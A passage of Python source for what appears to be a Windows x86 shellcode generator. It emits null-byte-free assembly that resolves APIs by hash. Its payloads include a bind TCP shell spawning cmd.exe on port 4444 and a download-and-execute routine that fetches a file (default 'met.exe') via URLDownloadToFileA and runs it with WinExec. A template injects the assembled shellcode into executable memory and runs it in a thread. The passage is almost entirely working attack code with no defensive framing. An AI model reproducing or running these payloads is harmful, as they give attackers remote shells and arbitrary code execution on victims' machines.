        self.add_line(hash_str, "Push hash for GetUserProfileDirectoryA")
        self.add_line("call dword ptr [ebp + 0x04]", "Call function finder")
        self.add_line(f"mov [ebp + {hex(profile_offset)}], eax", "Store API address")
        
        self.functions_added.append(("GetUserProfileDirectoryA", profile_offset))
        self.func_offset += 0x4
        
        self.add_comment("")
        self.add_line("mov ebx, [ebp + 0x8]", "Restore kernel32 base")
        
        self.add_comment("")
        self.add_comment("# Setup parameters")
        # FIXED: Use proper technique to avoid null bytes
        if buffer_size == 256:
            self.add_line("xor eax, eax")
            self.add_line("mov ah, 0x1", "AH = 1, so EAX = 0x100 (256)")
        else:
            # For other buffer sizes
            if buffer_size <= 0xFF:
                self.add_line("xor eax, eax")
                self.add_line(f"mov al, {hex(buffer_size)}")
            elif buffer_size <= 0xFFFF:
                self.add_line("xor eax, eax")
                self.add_line(f"mov ax, {hex(buffer_size)}")
            else:
                self.add_line(f"mov eax, {hex(buffer_size)}")
        
        self.add_line("push eax", "Push buffer size")
        self.add_line("mov esi, esp", "ESI = pointer to buffer size")
        self.add_line("push esi", "lpcchSize (in/out)")
        self.add_line("lea edi, [ebp + 0x40]", "Buffer for profile path")
        self.add_line("push edi", "lpProfileDir")
        self.add_line("push 0xfffffffc", "hToken = -4 (current process)")
        
        self.add_line(f"call [ebp + {hex(profile_offset)}]", "Call GetUserProfileDirectoryA")
        
        self.add_comment("")
        self.add_comment("# Save path length")
        self.add_line("mov ecx, [esi]", "Get returned length")
        self.add_line("dec ecx", "Exclude NULL terminator")
        self.add_line("mov [ebp - 0x10], ecx", "Store clean length")
        self.add_line("add esp, 0x04", "Cleanup stack")
        self.add_comment("# Profile directory retrieved")
    
    def generate_loadlibrary(self, dll_name):
        """
        Generate code to load a DLL dynamically.
        
        Args:
            dll_name (str): Name of the DLL to load
        """
        self.add_comment("")
        self.add_comment(f"# Load DLL: {dll_name}")
        
        offset = self.add_api_resolution("LoadLibraryA")
        
        if dll_name.lower() == "ws2_32.dll":
            self.add_comment("# Special handling for ws2_32.dll")
            self.add_line("xor eax, eax")
            self.add_line("mov ax, 0x6c6c", "'ll'")
            self.add_line("push eax")
            self.add_line("push 0x642e3233", "'32.d'")
            self.add_line("push 0x5f327377", "'ws2_'")
        else:
            for item in self.build_string_no_nulls(dll_name):
                self._process_string_item(item)
        
        self.add_comment("")
        self.add_line("push esp", "Push DLL name pointer")
        self.add_line(f"call [ebp + {hex(offset)}]", f"Load {dll_name}")
        self.add_line("mov ebx, eax", f"Save {dll_name} base address")
        self.add_comment(f"# {dll_name} loaded successfully")
    def generate_bind_shell(self, port=4444, spawn_process="cmd.exe"):
        """
        Generate a full bind TCP shell payload.
        
        Args:
            port (int): Port to listen on (default 4444)
            spawn_process (str): Process to spawn after connection (default "cmd.exe")
        """
        self.add_comment("")
        self.add_comment("# Bind TCP shell payload")
        self.add_comment(f"# Listening on port {port}")
        self.add_comment(f"# Spawning: {spawn_process}")
        
        loadlibrary_offset = self._ensure_api_available("LoadLibraryA")
        createprocess_offset = self._ensure_api_available("CreateProcessA")
        waitforsingleobject_offset = self._ensure_api_available("WaitForSingleObject")
        
        self.add_comment("")
        self.add_comment("# Load ws2_32.dll")
        self.add_line("xor ecx, ecx")
        self.add_line("mov cx, 0x6c6c")
        self.add_line("push ecx")
        self.add_line("push 0x642e3233")
        self.add_line("push 0x5f327377")
        self.add_line("push esp")
        self.add_line(f"call [ebp + {hex(loadlibrary_offset)}]")
        
        self.add_comment("")
        self.add_comment("# Resolve ws2_32 functions")
        self.add_line("mov ebx, eax")
        
        hash_str = self.push_function_hash("WSAStartup")
        wsastartup_offset = self.func_offset
        self.add_line(hash_str)
        self.add_line("call dword ptr [ebp + 0x04]")
        self.add_line(f"mov [ebp + {hex(wsastartup_offset)}], eax")
        self.functions_added.append(("WSAStartup", wsastartup_offset))
        self.func_offset += 0x4
        
        hash_str = self.push_function_hash("WSASocketA")
        wsasocket_offset = self.func_offset
        self.add_line(hash_str)
        self.add_line("call dword ptr [ebp + 0x04]")
        self.add_line(f"mov [ebp + {hex(wsasocket_offset)}], eax")
        self.functions_added.append(("WSASocketA", wsasocket_offset))
        self.func_offset += 0x4
        
        hash_str = self.push_function_hash("bind")
        bind_offset = self.func_offset
        self.add_line(hash_str)
        self.add_line("call dword ptr [ebp + 0x04]")
        self.add_line(f"mov [ebp + {hex(bind_offset)}], eax")
        self.functions_added.append(("bind", bind_offset))
        self.func_offset += 0x4
        
        hash_str = self.push_function_hash("listen")
        listen_offset = self.func_offset
        self.add_line(hash_str)
        self.add_line("call dword ptr [ebp + 0x04]")
        self.add_line(f"mov [ebp + {hex(listen_offset)}], eax")
        self.functions_added.append(("listen", listen_offset))
        self.func_offset += 0x4
        
        hash_str = self.push_function_hash("accept")
        accept_offset = self.func_offset
        self.add_line(hash_str)
        self.add_line("call dword ptr [ebp + 0x04]")
        self.add_line(f"mov [ebp + {hex(accept_offset)}], eax")
        self.functions_added.append(("accept", accept_offset))
        self.func_offset += 0x4
        
        self.add_comment("")
        self.add_comment("# WSAStartup")
        self.add_line("mov eax, esp")
        self.add_line("mov cx, 0x590")
        self.add_line("sub eax, ecx")
        self.add_line("push eax")
        self.add_line("xor eax, eax")
        self.add_line("mov ax, 0x0202")
        self.add_line("push eax")
        self.add_line(f"call [ebp + {hex(wsastartup_offset)}]")
        
        self.add_comment("")
        self.add_comment("# WSASocketA")
        self.add_line("xor eax, eax")
        self.add_line("push eax")
        self.add_line("push eax")
        self.add_line("push eax")
        self.add_line("push 0x06")
        self.add_line("push 0x01")
        self.add_line("push 0x02")
        self.add_line(f"call [ebp + {hex(wsasocket_offset)}]")
        
        self.add_comment("")
        self.add_comment("# Prepare bind")
        # Convert port to network byte order properly
        port_network = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF)
        
        self.add_line("xor edx, edx")
        self.add_line("mov esi, eax")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line(f"mov dx, {hex(port_network)}")
        self.add_line("shl edx, 0x10")
        self.add_line("add dx, 0x02")
        self.add_line("push edx")
        self.add_line("mov edi, esp")
        
        self.add_comment("")
        self.add_comment("# bind")
        self.add_line("push 0x10")
        self.add_line("push edi")
        self.add_line("push esi")
        self.add_line(f"call [ebp + {hex(bind_offset)}]")
        
        self.add_comment("")
        self.add_comment("# listen")
        self.add_line("push eax")
        self.add_line("push esi")
        self.add_line(f"call [ebp + {hex(listen_offset)}]")
        
        self.add_comment("")
        self.add_comment("# accept")
        self.add_line("push eax")
        self.add_line("push eax")
        self.add_line("push esi")
        self.add_line(f"call [ebp + {hex(accept_offset)}]")
        self.add_line("mov esi, eax", "ESI = client socket")
        
        self.add_comment("")
        self.add_comment("# STARTUPINFOA")
        self.add_line("xor edx, edx")
        self.add_line("push esi", "hStdError")
        self.add_line("push esi", "hStdOutput")
        self.add_line("push esi", "hStdInput")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("sub edx, 0xfffffeff")
        self.add_line("dec edx")
        self.add_line("push edx")
        self.add_line("xor edx, edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push edx")
        self.add_line("push 0x44")
        self.add_line("mov ebx, esp")
        
        self.add_comment("")
        self.add_comment("# CreateProcessA")
        self.add_line("xor ecx, ecx")
        self.add_line("push 0x61657865")
        self.add_line("sub byte ptr [esp + 0x03], 0x61")
        self.add_line("push 0x2e646d63")
        self.add_line("mov edi, esp")
        self.add_line("mov eax, esp")
        self.add_line("mov cx, 0x390")
        self.add_line("sub eax, ecx")
        self.add_line("push eax", "lpProcessInformation")
        self.add_line("push ebx", "lpStartupInfo")
        self.add_line("push edx", "lpCurrentDirectory")
        self.add_line("push edx", "lpEnvironment")
        self.add_line("push edx", "dwCreationFlags")
        self.add_line("inc edx")
        self.add_line("push edx", "bInheritHandles = 1")
        self.add_line("dec edx")
        self.add_line("push edx", "lpThreadAttributes")
        self.add_line("push edx", "lpProcessAttributes")
        self.add_line("push edi", "lpCommandLine")
        self.add_line("push edx", "lpApplicationName")
        self.add_line(f"call [ebp + {hex(createprocess_offset)}]")
        
        self.add_comment("")
        self.add_comment("# Exit")
        self.add_line("xor ecx, ecx")
        self.add_line("push ecx")
        self.add_line("push 0xffffffff")
        self.add_line(f"call [ebp + {hex(waitforsingleobject_offset)}]")
    
    def build_dynamic_user_path(self, filename="met.exe"):
        """
        Build a dynamic user path for file operations.
        
        Args:
            filename (str): Filename to append to user path
            
        Returns:
            str: Register name containing the path pointer
        """
        self.add_comment("")
        self.add_comment(f"# Build dynamic user path for: {filename}")
        
        has_profile_dir = any(name == "GetUserProfileDirectoryA" for name, _ in self.functions_added)
        has_username = any(name == "GetUserNameA" for name, _ in self.functions_added)
        
        if has_profile_dir:
            self.add_comment("# Using profile directory")
            source_addr = "ebp + 0x40"
            length_addr = "ebp - 0x10"
            use_lea = True
            
        elif has_username:
            self.add_comment("# Building path from username")
            username_addr = "ebp + 0x24"
            username_length_addr = "ebp - 0x8"
            
            prefix = "C:\\Users\\"
            prefix_len = len(prefix)
            
            self.add_line(f"mov ecx, [{username_length_addr}]", "Get username length")
            self.add_line(f"add ecx, {prefix_len}", "Add prefix length")
            self.add_line("add ecx, 3")
            self.add_line("and ecx, 0xfffffffc", "Align to 4 bytes")
            self.add_line("sub esp, ecx", "Allocate buffer")
            self.add_line("mov edi, esp", "EDI = buffer start")
            
            self.add_comment("# Write prefix 'C:\\Users\\'")
            for char in prefix:
                self.add_line(f"mov al, {hex(ord(char))}")
                self.add_line("stosb")
            
            self.add_comment("# Append username")
            self.add_line(f"lea esi, [{username_addr}]", "ESI = username")
            self.add_line(f"mov ecx, [{username_length_addr}]", "ECX = username length")
            
            copy_loop = f"copy_username_{self.label_counter}"
            copy_done = f"copy_username_done_{self.label_counter}"
            self.label_counter += 1
            
            self.add_line(f"{copy_loop}:")
            self.add_line("test ecx, ecx", "Check if done")
            self.add_line(f"jz {copy_done}")
            self.add_line("lodsb", "Load byte")
            self.add_line("stosb", "Store byte")
            self.add_line("dec ecx")
            self.add_line(f"jmp {copy_loop}")
            self.add_line(f"{copy_done}:")
            
            self.add_line("mov [ebp - 0x18], esp", "Save combined path pointer")
            self.add_line(f"mov ecx, [{username_length_addr}]", "Get username length")
            self.add_line(f"add ecx, {prefix_len}", "Add prefix length")
            self.add_line("mov [ebp - 0x14], ecx", "Store total length")
            
            source_addr = "ebp - 0x18"
            length_addr = "ebp - 0x14"
            use_lea = False
            
        else:
            raise ValueError("No user information available")
        
        self.add_line(f"mov ecx, [{length_addr}]", "Load base length")
        append_len = len(filename) + 1
        self.add_line(f"add ecx, {append_len}", f"Add space for '\\{filename}'")
        self.add_line("inc ecx", "Add NULL terminator")
        self.add_line("add ecx, 3")
        self.add_line("and ecx, 0xfffffffc", "Align to 4 bytes")
        self.add_line("sub esp, ecx", "Allocate final buffer")
        self.add_line("mov edi, esp", "EDI = final buffer")
        
        if use_lea:
            self.add_line(f"lea esi, [{source_addr}]", "ESI = source string")
        else:
            self.add_line(f"mov esi, [{source_addr}]", "ESI = source pointer")
        
        self.add_line(f"mov ecx, [{length_addr}]", "ECX = base length")
        copy_loop = f"copy_base_{self.label_counter}"
        copy_done = f"copy_base_done_{self.label_counter}"
        self.label_counter += 1
        
        self.add_line(f"{copy_loop}:")
        self.add_line("test ecx, ecx", "Check if done")
        self.add_line(f"jz {copy_done}")
        self.add_line("lodsb", "Load byte")
        self.add_line("stosb", "Store byte")
        self.add_line("dec ecx")
        self.add_line(f"jmp {copy_loop}")
        self.add_line(f"{copy_done}:")
        
        self.add_line("mov al, 0x5c", "Backslash '\\'")
        self.add_line("stosb", "Write directory separator")
        
        for char in filename:
            self.add_line(f"mov al, {hex(ord(char))}")
            self.add_line("stosb")
        
        self.add_line("xor al, al", "NULL byte")
        self.add_line("stosb", "Terminate string")
        
        self.add_line("mov edx, esp", "EDX = full path pointer")
        self.add_comment("# Dynamic path built successfully")
        return "edx"
    
    def generate_download_and_execute(self, url, csidl=0x10, filename=None):
        """
        Download an HTTP file to a CSIDL folder using SHGetFolderPathA + URLDownloadToFileA,
        execute it with WinExec, and terminate with TerminateProcess.
        """
        if not filename:
            filename = url.split("/")[-1] or "met.exe"

        self.add_comment("")
        self.add_comment("# Download file and execute (SHGetFolderPathA + URLDownloadToFileA + WinExec)")
        self.add_comment(f"# URL: {url}")
        self.add_comment(f"# CSIDL: {hex(csidl)}")
        self.add_comment(f"# Filename: {filename}")

        fixed_offsets = {
            "LoadLibraryA": 0x10,
            "WinExec": 0x18,
            "SHGetFolderPathA": 0x1c,
            "URLDownloadToFileA": 0x20,
        }

        self.add_line("mov ebx, [ebp+0x8]", "Restore kernel32 base")
        loadlibrary_offset = self._ensure_api_available("LoadLibraryA", desired_offset=fixed_offsets["LoadLibraryA"])
        winexec_offset = self._ensure_api_available("WinExec", desired_offset=fixed_offsets["WinExec"])

        self.add_comment("# Load Shell32.dll and resolve SHGetFolderPathA")
        for item in self.build_string_no_nulls("Shell32.dll", dest_reg="esi"):
            self._process_string_item(item)
        self.add_line("push esi", "DLL name for Shell32.dll")
        self.add_line(f"call [ebp + {hex(loadlibrary_offset)}]", "Load Shell32.dll")
        self.add_line("mov ebx, eax", "EBX = Shell32 base")
        shget_offset = self.add_api_resolution("SHGetFolderPathA", desired_offset=fixed_offsets["SHGetFolderPathA"])

        self.add_comment("# Load Urlmon.dll and resolve URLDownloadToFileA")
        for item in self.build_string_no_nulls("Urlmon.dll", dest_reg="esi"):
            self._process_string_item(item)
        self.add_line("push esi", "DLL name for Urlmon.dll")
        self.add_line(f"call [ebp + {hex(loadlibrary_offset)}]", "Load Urlmon.dll")
        self.add_line("mov ebx, eax", "EBX = Urlmon base")
        url_dl_offset = self.add_api_resolution("URLDownloadToFileA", desired_offset=fixed_offsets["URLDownloadToFileA"])

        self.add_comment("# Fetch target folder via SHGetFolderPathA")
        self.add_line("mov eax, 0x41414141", "Prep for MAX_PATH without NULL")
        self.add_line("sub eax, 0x4141403d", "EAX = 0x104")
        self.add_line("sub esp, eax", "Allocate buffer")
        self.add_line("mov edi, esp", "EDI = buffer")
        self.add_line("xor eax, eax")
        self.add_line("push edi", "pszPath")
        self.add_line("push eax", "dwFlags = 0")
        self.add_line("push eax", "hToken = NULL")
        self.add_line(f"push {hex(csidl)}", "CSIDL value")
        self.add_line("push eax", "hwnd = NULL")
        self.add_line(f"call [ebp + {hex(shget_offset)}]", "SHGetFolderPathA")

        ok_path = f"path_ok_{self.label_counter}"
        fail_path = f"path_fail_{self.label_counter}"
        self.label_counter += 1
        self.add_line("test eax, eax", "Check SHGetFolderPathA result (S_OK == 0)")
        self.add_line(f"jnz {fail_path}")
        self.add_line(f"{ok_path}:")

        self.add_comment("# Append filename to returned path")
        find_null = f"find_null_{self.label_counter}"
        self.label_counter += 1
        self.add_line("mov esi, edi", "ESI = path start")
        self.add_line(f"{find_null}:")
        self.add_line("lodsb")
        self.add_line("test al, al")
        self.add_line(f"jnz {find_null}")
        self.add_line("dec esi")
        self.add_line("mov byte ptr [esi], 0x5c", "Insert '\\\\'")
        for idx, ch in enumerate(filename):
            self.add_line(f"mov byte ptr [esi+{idx+1}], {hex(ord(ch))}")
        self.add_line("xor eax, eax")
        self.add_line(f"mov byte ptr [esi+{len(filename)+1}], al", "NULL terminator")
        self.add_line("mov edx, edi", "EDX = full destination path")
        self.add_line(f"{fail_path}:")
        self.add_line("ret")

        self.add_comment("# Build URL string on stack")
        for item in self.build_string_no_nulls(url, dest_reg="ecx"):
            self._process_string_item(item)

        self.add_comment("# Download via URLDownloadToFileA")
        self.add_line("xor eax, eax")
        self.add_line("push eax", "lpfnCB = NULL")
        self.add_line("push eax", "dwReserved = 0")
        self.add_line("push edx", "szFileName (destination)")
        self.add_line("push ecx", "szURL")
        self.add_line("push eax", "pCaller = NULL")
        self.add_line(f"call [ebp + {hex(url_dl_offset)}]")

        ok_dl = f"download_ok_{self.label_counter}"
        self.label_counter += 1
        self.add_line("test eax, eax", "Check HRESULT (S_OK == 0)")
        self.add_line(f"jz {ok_dl}")
        self.add_line("ret")
        self.add_line(f"{ok_dl}:")

        self.add_comment("# Execute downloaded file")
        self.add_line("xor eax, eax")
        self.add_line("push 1", "SW_SHOWNORMAL")
        self.add_line("push edx", "lpCmdLine")
        self.add_line(f"call [ebp + {hex(winexec_offset)}]")

        self.add_comment("# Clean exit")
        self.add_line("ret")
    
    def generate_path_with_shgetfolder(self, csidl=0x10, filename="met.exe"):
        fixed_offsets = {
            "LoadLibraryA": 0x14,
            "SHGetFolderPathA": 0x20,
        }
        self.add_line("mov ebx, [ebp+0x8]", "Restore kernel32.dll base address from [EBP+0x8] (saved earlier during PEB walk)")
        loadlibrary_offset = self._ensure_api_available("LoadLibraryA", desired_offset=fixed_offsets["LoadLibraryA"])

        # Load Shell32.dll
        for item in self.build_string_no_nulls("Shell32.dll", dest_reg="esi"):
            self._process_string_item(item)
        self.add_line("push esi", "Push pointer to 'Shell32.dll' string onto stack as argument for LoadLibraryA")
        self.add_line(f"call [ebp + {hex(loadlibrary_offset)}]", f"Call LoadLibraryA at [EBP+{hex(loadlibrary_offset)}] to load Shell32.dll into process memory")
        self.add_line("mov ebx, eax", "Move returned DLL base address (HMODULE) to EBX for use in API resolution")
        shget_offset = self.add_api_resolution(
            "SHGetFolderPathA", 
            desired_offset=fixed_offsets["SHGetFolderPathA"],
            api_description="Retrieves the path of a special folder (e.g., Desktop, AppData) identified by CSIDL value",
            parameters=[
                f"hwnd (NULL): Window handle (unused, set to NULL)",
                f"nFolder (0x{hex(csidl)}): CSIDL value specifying folder type (0x10 = Desktop)",
                "hToken (NULL): Access token (unused, set to NULL)",
                "dwFlags (0): Reserved flags (set to 0)",
                "pszPath (EDI): Pointer to buffer receiving path string (MAX_PATH = 260 bytes)"
            ]
        )

        # Call SHGetFolderPathA
        self.add_comment("")
        self.add_comment("===== Call SHGetFolderPathA =====")
        self.add_line("mov eax, 0x41414141", "Load value 0x41414141 into EAX (avoids NULL bytes in immediate)")
        self.add_line("sub eax, 0x4141403d", "Subtract to calculate 0x104 (260 decimal = MAX_PATH buffer size) without NULL bytes")
        self.add_line("sub esp, eax", "Allocate 0x104 (260) bytes on stack for path buffer (stack grows downward)")
        self.add_line("mov edi, esp", "Store stack pointer (buffer start address) in EDI for path operations")
        self.add_line("xor eax, eax", "Clear EAX to zero (used for NULL parameters in API call)")
        self.add_line("push edi", "Push buffer pointer (pszPath parameter) - SHGetFolderPathA will write path here")
        self.add_line("push eax", "Push dwFlags = 0 (reserved, must be zero)")
        self.add_line("push eax", "Push hToken = NULL (current user token, NULL means use current process)")
        self.add_line(f"push {hex(csidl)}", f"Push nFolder = {hex(csidl)} (CSIDL constant specifying folder type, e.g., 0x10 = Desktop)")
        self.add_line("push eax", "Push hwnd = NULL (window handle, unused for this operation)")
        self.add_line(f"call [ebp + {hex(shget_offset)}]", f"Call SHGetFolderPathA at [EBP+{hex(shget_offset)}] to retrieve special folder path")

        # Append filename
        self.add_comment("")
        self.add_comment("===== Append Filename to Path =====")
        find_null = f"find_null_{self.label_counter}"
        self.label_counter += 1
        self.add_line("mov esi, edi", "Copy path buffer pointer to ESI to scan for NULL terminator")
        self.add_line(f"{find_null}:", "Label: Loop to find end of path string")
        self.add_line("lodsb", "Load byte from [ESI] into AL and increment ESI (scans string forward)")
        self.add_line("test al, al", "Check if loaded byte is NULL (0x00) which marks end of string")
        self.add_line(f"jnz {find_null}", "If byte is not NULL, continue scanning to next character")
        self.add_line("dec esi", "Decrement ESI to point back at the NULL terminator position")
        self.add_line("mov byte ptr [esi], 0x5c", "Replace NULL with backslash (0x5C = '\\') to separate path from filename")
        for idx, ch in enumerate(filename):
            self.add_line(f"mov byte ptr [esi+{idx+1}], {hex(ord(ch))}", f"Write character '{ch}' at offset {idx+1} to build filename")
        self.add_line("xor eax, eax", "Clear EAX register to zero (faster than mov eax, 0 and avoids NULL bytes)")
        self.add_line(f"mov byte ptr [esi+{len(filename)+1}], al", f"Write NULL terminator after filename at offset {len(filename)+1} to properly terminate full path string")
        self.add_line("mov edx, edi", "Copy full path buffer pointer to EDX register for later use")
        self.add_line("mov [ebp-0x30], edx", f"Store full path pointer at [EBP-0x30] so it can be retrieved later by download/execute functions")

    def generate_download_to_stored_path(self, url):
        """
        Only download URL to the path stored at [ebp-0x30].
        """
        fixed_offsets = {
            "LoadLibraryA": 0x14,
            "URLDownloadToFileA": 0x24,
        }
        self.add_comment("")
        self.add_comment("===== Load Urlmon.dll =====")
        self.add_line("mov ebx, [ebp+0x8]", "Restore kernel32.dll base address from [EBP+0x8] for LoadLibraryA call")
        loadlibrary_offset = self._ensure_api_available("LoadLibraryA", desired_offset=fixed_offsets["LoadLibraryA"])

        # Ensure Urlmon.dll + URLDownloadToFileA
        self.add_comment("Building 'Urlmon.dll' string on stack")
        for item in self.build_string_no_nulls("Urlmon.dll", dest_reg="esi"):
            self._process_string_item(item)
        self.add_line("push esi", "Push pointer to 'Urlmon.dll' string onto stack as argument for LoadLibraryA")
        self.add_line(f"call [ebp + {hex(loadlibrary_offset)}]", f"Call LoadLibraryA at [EBP+{hex(loadlibrary_offset)}] to load Urlmon.dll (HTTP download functionality)")
        self.add_line("mov ebx, eax", "Move returned Urlmon.dll base address to EBX for URLDownloadToFileA resolution")
        url_dl_offset = self.add_api_resolution(
            "URLDownloadToFileA", 
            desired_offset=fixed_offsets["URLDownloadToFileA"],
            api_description="Downloads a file from HTTP/HTTPS URL and saves it to local file system",
            parameters=[
                "pCaller (NULL): COM interface pointer (unused, set to NULL)",
                "szURL (ECX): Pointer to URL string (e.g., 'http://192.168.1.1/file.exe')",
                "szFileName (EDX): Pointer to destination file path (from [EBP-0x30])",
                "dwReserved (0): Reserved flags (must be zero)",
                "lpfnCB (NULL): Callback function pointer (unused, set to NULL)"
            ]
        )

        # Load stored path
        self.add_comment("")
        self.add_comment("===== Build URL String =====")
        self.add_line("mov edx, [ebp-0x30]", "Load full file path pointer from [EBP-0x30] (set earlier by SHGetFolderPathA path builder)")

        # Build URL string
        self.add_comment(f"Building URL string '{url}' on stack")
        for item in self.build_string_no_nulls(url, dest_reg="ecx"):
            self._process_string_item(item)

        # Download
        self.add_comment("")
        self.add_comment("===== Call URLDownloadToFileA =====")
        self.add_line("xor eax, eax", "Clear EAX to zero for NULL parameters in URLDownloadToFileA call")
        self.add_line("push eax", "Push lpfnCB = NULL (no callback function needed for download progress)")
        self.add_line("push eax", "Push dwReserved = 0 (reserved parameter, must be zero)")
        self.add_line("push edx", "Push szFileName = EDX (destination file path where downloaded file will be saved)")
        self.add_line("push ecx", "Push szURL = ECX (source URL string pointer, e.g., 'http://192.168.1.1/file.exe')")
        self.add_line("push eax", "Push pCaller = NULL (COM interface pointer, unused for this operation)")
        self.add_line(f"call [ebp + {hex(url_dl_offset)}]", f"Call URLDownloadToFileA at [EBP+{hex(url_dl_offset)}] to download file from URL to local path")

    def generate_winexec_stored_path(self):
        """
        Execute the path stored at [ebp-0x30] via WinExec.
        """
        fixed_offsets = {
            "WinExec": 0x1c,
        }
        self.add_comment("")
        self.add_comment("===== Execute Downloaded File =====")
        self.add_line("mov ebx, [ebp+0x8]", "Restore kernel32.dll base address from [EBP+0x8] for WinExec resolution")
        winexec_offset = self._ensure_api_available(
            "WinExec", 
            desired_offset=fixed_offsets["WinExec"],
            api_description="Executes an application (program) by specifying its file path or command line",
            parameters=[
                "lpCmdLine (EDX): Pointer to command line string or executable path (from [EBP-0x30])",
                "uCmdShow (1): Window show state (1 = SW_SHOWNORMAL - show window normally)"
            ]
        )

        self.add_line("mov edx, [ebp-0x30]", "Load full executable path pointer from [EBP-0x30] (set earlier by path builder)")

        self.add_line("xor eax, eax", "Clear EAX to zero (will be incremented to set uCmdShow parameter)")
        self.add_line("push 1", "Push uCmdShow = 1 (SW_SHOWNORMAL - show window in normal size, not minimized)")
        self.add_line("push edx", "Push lpCmdLine = EDX (executable file path to execute, e.g., 'C:\\Users\\...\\met.exe')")
        self.add_line(f"call [ebp + {hex(winexec_offset)}]", f"Call WinExec at [EBP+{hex(winexec_offset)}] to execute downloaded file from path")

    # Helper Methods
    def _process_string_item(self, item):
        """
        Process a string building item and add it to the code.
        
        Args:
            item: Either a tuple (instruction, explanation) or a string instruction
        """
        if isinstance(item, tuple):
            instruction, explanation = item
            # If instruction is just "#", treat it as a comment placeholder
            # Store it as "#" with explanation so save_to_file can handle it properly
            if instruction.strip() == "#":
                if explanation:
                    # Add as comment marker with explanation
                    self.code.append("#")
                    self.code_with_comments.append(("#", explanation))
                else:
                    self.add_comment("")
            else:
                self.add_line(instruction, explanation)
        else:
            self.add_line(item)
    
    def _ensure_api_available(self, api_name, desired_offset=None, api_description=None, parameters=None):
        """
        Ensure an API is available, resolving it if necessary.
        
        Args:
            api_name (str): The API function name
            desired_offset (int, optional): Force a specific storage offset
            api_description (str, optional): Description of what the API does
            parameters (list, optional): List of parameter descriptions
              
        Returns:
            int: The offset where the API address is stored
        """
        if api_name in self.api_offsets:
            return self.api_offsets[api_name]
        offset = self.add_api_resolution(api_name, desired_offset=desired_offset, api_description=api_description, parameters=parameters)
        return offset
    
    def get_code(self):
        """
        Get the raw assembly code without explanations.
        
        Returns:
            list: List of assembly instructions
        """
        return self.code
    
    def get_code_with_explanations(self):
        """
        Get the assembly code with inline explanations.
        
        Returns:
            list: List of tuples (instruction, explanation)
        """
        return self.code_with_comments
    
    def save_to_file(self, filename, with_explanations=True):
        """
        Save the generated shellcode to a file with execution template.
        
        Args:
            filename (str): Output file name
            with_explanations (bool): Include comments in the output
        """
        with open(filename, 'w') as f:
            f.write("""#!/usr/bin/env python3

from keystone import *
import ctypes
import struct
import sys

def ror_str(byte, count):
    binb = format(byte & 0xFFFFFFFF, '032b')
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return int(binb, 2)

def push_function_hash(function_name):
    edx = 0x00
    ror_count = 0
    for eax in function_name:
        edx = edx + ord(eax)
        if ror_count < len(function_name) - 1:
            edx = ror_str(edx, 0xd)
        ror_count += 1
    return "push " + hex(edx & 0xFFFFFFFF)

def asm2shell(assembly_code):
    print("Generating shellcode...")
    
    # Initialize Keystone engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    
    try:
        encoding, count = ks.asm(assembly_code)
    except KsError as e:
        print(f"Assembly error: {e}")
        return None
    
    shellcode_bytes = b""
    shellcode_string = ""
    
    for byte in encoding:
        shellcode_bytes += struct.pack("B", byte)
        shellcode_string += f"\\\\x{byte:02x}"
    
    print(f"Shellcode size: {count} bytes")
    print(f"Shellcode: {shellcode_string}")
    
    # Allocate executable memory
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode_bytes)),
        ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
        ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
    )
    
    if not ptr:
        print("Failed to allocate memory")
        return None
    
    print(f"Shellcode allocated at address: {hex(ptr)}")
    
    # Copy shellcode to allocated memory
    buf = (ctypes.c_char * len(shellcode_bytes)).from_buffer_copy(shellcode_bytes)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        buf,
        ctypes.c_int(len(shellcode_bytes))
    )
    
    return ptr

def execute_shellcode(shellcode_ptr):
    print("Ready to execute shellcode...")
    input("Press ENTER to execute...")
    
    # Create thread to execute shellcode
    thread_handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(shellcode_ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    
    if not thread_handle:
        print("Failed to create thread")
        return False
    
    # Wait for thread to complete
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(thread_handle),
        ctypes.c_int(-1)  # INFINITE
    )
    
    print("Shellcode execution completed")
    return True

def main():
    code = [
""")
            
            last_was_label = False
            code_lines = []
            
            for i, item in enumerate(self.code_with_comments):
                if isinstance(item, tuple):
                    line, explanation = item
                    
                    if not line.strip() and not explanation:
                        last_was_label = False
                        continue
                    
                    # Handle comments
                    if line.startswith('#'):
                        # Skip comment markers, only write actual comments
                        if line.strip() == "#":
                            continue
                        # Store comment line
                        code_lines.append(('comment', line))
                        last_was_label = False
                    else:
                        # Handle labels and instructions
                        if line.strip().endswith(':'):
                            # Label
                            if not last_was_label and i > 0 and code_lines:
                                code_lines.append(('empty', ''))
                            if explanation:
                                escaped_line = line.replace('\\', '\\\\').replace('"', '\\"')
                                escaped_explanation = explanation.replace('\\', '\\\\').replace('"', '\\"')
                                code_lines.append(('code', escaped_line, escaped_explanation))
                                self.shellcode.append(line)
                            else:
                                escaped_line = line.replace('\\', '\\\\').replace('"', '\\"')
                                code_lines.append(('code', escaped_line, None))
                                self.shellcode.append(line)
                            last_was_label = True
                        else:
                            # Regular instruction
                            escaped_line = line.replace('\\', '\\\\').replace('"', '\\"')
                            if explanation:
                                escaped_explanation = explanation.replace('\\', '\\\\').replace('"', '\\"')
                                code_lines.append(('code', f"{escaped_line};", escaped_explanation))
                                self.shellcode.append(line)
                            else:
                                code_lines.append(('code', f"{escaped_line};", None))
                                self.shellcode.append(line)
                            last_was_label = False
                else:
                    # Not a tuple, treat as plain line
                    if line.strip():
                        escaped_line = line.replace('\\', '\\\\').replace('"', '\\"')
                        code_lines.append(('code', escaped_line, None))
                        self.shellcode.append(line)
                    last_was_label = False
            
